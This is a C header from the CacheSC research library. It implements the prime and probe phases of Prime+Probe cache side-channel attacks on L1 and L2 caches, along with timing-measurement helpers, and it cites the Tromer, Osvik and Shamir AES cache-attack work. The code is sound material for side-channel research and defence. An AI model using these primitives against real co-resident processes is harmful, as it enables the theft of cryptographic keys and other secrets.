/*
 * This file is part of the CacheSC library (https://github.com/Miro-H/CacheSC),
 * which implements Prime+Probe attacks on virtually and physically indexed
 * caches.
 *
 * Copyright (C) 2020  Miro Haller
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 *
 * Contact: miro.haller@alumni.ethz.ch
 *
 * Short description of this file:
 * Implementation of the Prime+Probe attack against caches. Initially based on
 * the description of "Efficient Cache Attacks on AES, and Countermeasures"
 * by E.Tromer, D.A.Osvik and A.Shamir. However, extended to work on contemporary
 * architectures as well as physically indexed caches.
 */

#ifndef HEADER_CACHE_H
#define HEADER_CACHE_H

#ifndef _GNU_SOURCE
    #define _GNU_SOURCE
#endif

#define COLLISION_REP 100

#include <assert.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "addr_translation.h"
#include "asm.h"
#include "cache_types.h"
#include "l1_asm.h"
#include "l2_asm.h"
#include "util.h"

cacheline *prepare_cache_ds(cache_ctx *ctx);
cacheline *prepare_cache_set_ds(cache_ctx *ctx, uint32_t *sets, uint32_t sets_len);
void release_cache_ds(cache_ctx *ctx, cacheline *cl);
void release_cache_set_ds(cache_ctx *ctx, cacheline *cache_set_ds);
void prepare_measurement(void);

/*
 * The below functions are all "static inline" to prevent
 * the compiler from generating additional code that interferes
 * with measurements by accessing memory locations
 *
 *
 * On the data structure:
 * To minimise cache trashing, we use a doubly linked list for
 * cache sets and traverse it forward for priming and backwards
 * for probing. The cache sets are a simple linked list.
 */
__attribute__((always_inline))
static inline uint32_t access_diff(void *p);
__attribute__((always_inline))
static inline bool is_cached(cache_ctx *ctx, void *p);
__attribute__((always_inline))
static inline cacheline *prime(cacheline *head);
__attribute__((always_inline))
static inline cacheline *prime_rev(cacheline *head);
__attribute__((always_inline))
static inline cacheline *prime_cacheset(cacheline *head);
__attribute__((always_inline))
static inline cacheline *probe(cache_level cl, cacheline *head);
__attribute__((always_inline))
static inline cacheline *probe_cacheset(cache_level cl, cacheline *curr_cl);
__attribute__((always_inline))
static inline cacheline *probe_all_cachelines(cacheline *head);
__attribute__((always_inline))
static inline uint32_t probe_full_ds(cacheline *head);
__attribute__((always_inline))
static inline void get_per_set_sum_of_msrmts(cacheline *head, time_type *res);
__attribute__((always_inline))
static inline void get_all_msrmts_in_order(cacheline *head, time_type *res);
__attribute__((always_inline))
static inline void get_msrmt_for_set(cacheline *head, time_type *res);
__attribute__((always_inline))
static inline void get_msrmts_for_all_set(cacheline *head, time_type *res);
__attribute__((always_inline))
static inline void clear_cache(cache_ctx *ctx);

// Externally defined in automatically generated inlined ASM files
__attribute__((always_inline))
static inline cacheline *asm_l1_probe_cacheset(cacheline *curr_cl);
__attribute__((always_inline))
static inline cacheline *asm_l2_probe_cacheset(cacheline *curr_cl);

static inline uint32_t access_diff(void *p) {
    return accesstime(p) - accesstime_overhead();
}

/*
 * Accesses the given pointer and compares the access time to
 * the access latency of the given cache context
 */
static inline bool is_cached(cache_ctx *ctx, void *p) {
    return access_diff(p) <= ctx->access_time;
}

/*
 * Prime phase: fill the target cache (encoded in the size of the data structure)
 * with the prepared data structure, i.e. with attacker data.
 */
static inline cacheline *prime(cacheline *head) {
    cacheline *curr_cl = head;

    cpuid();
    do {
        curr_cl = curr_cl->next;
        mfence();
    } while(curr_cl != head);
    cpuid();

    return curr_cl->prev;
}

/*
 * Same as prime, but in the reverse direction, i.e. the same direction that probe
 * uses. This is beneficial for the following scenarios:
 *     - L1:
 *         - Trigger collision chain-reaction to amplify an evicted set (but this has
 *           the downside of more noisy measurements).
 *     - L2:
 *         - Always use this for L2, otherwise the first cache sets will still reside
 *           in L1 unless the victim filled L1 completely. In this case, an eviction
 *           has randomly (depending on where the cache set is placed in the randomised
 *           data structure) the following effect:
 *             A) An evicted set is L2_ACCESS_TIME - L1_ACCESS_TIME slower
 *             B) An evicted set is L3_ACCESS_TIME - L2_ACCESS_TIME slower
 */
static inline cacheline *prime_rev(cacheline *head) {
    cacheline *curr_cl = head;

    cpuid();
    do {
        curr_cl = curr_cl->prev;
        mfence();
    } while(curr_cl != head);
    cpuid();

    return curr_cl->prev;
}

/*
 * Same as prime but only for a given set (encoded in the created data structure)
 * XXX: Deprecated?
 */
static inline cacheline *prime_cacheset(cacheline *head) {
    cacheline *curr_cl;

    for (uint16_t i = 0; i < PLRU_REPS; ++i) {
        curr_cl = head;

        // Avoid accessing any cacheline outside this set
        while (1) {
            incq(curr_cl->padding);

            if (__builtin_expect(IS_LAST(curr_cl->flags), 0))
                break;

            curr_cl = curr_cl->next;
      }
    }

    return curr_cl;
}

/*
 * Calls the unrolled assembly code to probe a cache set, which is tailored
 * to the given cache level.
 */
static inline cacheline *probe_cacheset(cache_level cl, cacheline *curr_cl) {
    if (cl == L1)
        return asm_l1_probe_cacheset(curr_cl);
    else if (cl == L2)
        return asm_l2_probe_cacheset(curr_cl);
    else
        return NULL;
}

/*
 * Probe phase: access the data that was loaded to cache in the prime phase
 * again and measure the time to detect evictions.
 * Measure the time for all cache lines in the same set together to minimise
 * the overhead.
 */
static inline cacheline *probe(cache_level cl, cacheline *head) {
    cacheline *curr_cs = head;

    do {
        curr_cs = probe_cacheset(cl, curr_cs);
    } while(__builtin_expect(curr_cs != head, 1));

    return curr_cs->next;
}

/*
 * Probe and measure cachelines without grouping them to sets.
 * Has high overhead cost which might hide evictions.
 */
static inline cacheline *probe_all_cachelines(cacheline *head) {
    // Traverse cache sets in reverse order for minimal cache impact
    cacheline *curr_cl = head;
    do {
        curr_cl->time_msrmt = accesstime(curr_cl);
        curr_cl             = curr_cl->prev;
    } while (__builtin_expect(curr_cl != head, 1));

    return curr_cl->next;
}

/*
 * Probe the full data structure in a single time measurement
 */
static inline uint32_t probe_full_ds(cacheline *head) {
    uint32_t time;
    cacheline *curr_cl = head;

    start_timer();
    do {
        curr_cl = curr_cl->prev;
    } while(curr_cl != head);
    stop_timer(&time);

    return time;
}

/*
 * Extract the time measurements from the attack structure. This assumes all
 * cache lines have been measured separately and sums the access times of those
 * lines that map to the same cache set.
 */
static inline void get_per_set_sum_of_msrmts(cacheline *head, time_type *res) {
    cacheline *curr_cl = head;
    do {
        res[curr_cl->cache_set] += curr_cl->time_msrmt;
        curr_cl = curr_cl->next;
    } while (curr_cl != head);
}

/*
 * Extract the time measurements for each cache line from the attack structure.
 */
static inline void get_all_msrmts_in_order(cacheline *head, time_type *res) {
    cacheline *curr_cl  = head;
    uint32_t idx        = 0;
    do {
        res[idx]    = curr_cl->time_msrmt;
        curr_cl     = curr_cl->prev;
        ++idx;
    } while (curr_cl != head);
}

/*
 * Extract the measurement of the cache set of `head` (which timed all its
 * cache lines in a single measurement)
 */
static inline void get_msrmt_for_set(cacheline *head, time_type *res) {
    cacheline *curr_cl  = head;
    do {
        if (curr_cl->cache_set == head->cache_set && IS_FIRST(curr_cl->flags)) {
            *res = curr_cl->time_msrmt;
        }

        curr_cl = curr_cl->prev;
    } while (curr_cl != head);
}

/*
 * Extract the time measurements from the complete cache ds. This assumes that
 * all cache lines of a cache set were measured together.
 */
static inline void get_msrmts_for_all_set(cacheline *head, time_type *res) {
    cacheline *curr_cl  = head;
    do {
        if (IS_FIRST(curr_cl->flags)) {
            res[curr_cl->cache_set] = curr_cl->time_msrmt;
        }

        curr_cl = curr_cl->prev;
    } while (curr_cl != head);
}

/*
 * This is a heuristic to hopefully clear the cache. The idea is to fill
 * the cache with known data and then flush those addresses.
 * However, the Tree-PLRU state is still unknown.
 */
static inline void clear_cache(cache_ctx *ctx) {
    cacheline *cacheline_arr = (cacheline *) malloc(ctx->cache_size);

    // Fill cache
    for (uint32_t i = 0; i < ctx->nr_of_cachelines; ++i) {
        incq(cacheline_arr[i].padding);
    }

    // Flush everything from cache
    for (uint32_t i = 0; i < ctx->nr_of_cachelines; ++i) {
        clflush(cacheline_arr + i);
    }

    free(cacheline_arr);
}

#endif // HEADER_CACHE_H
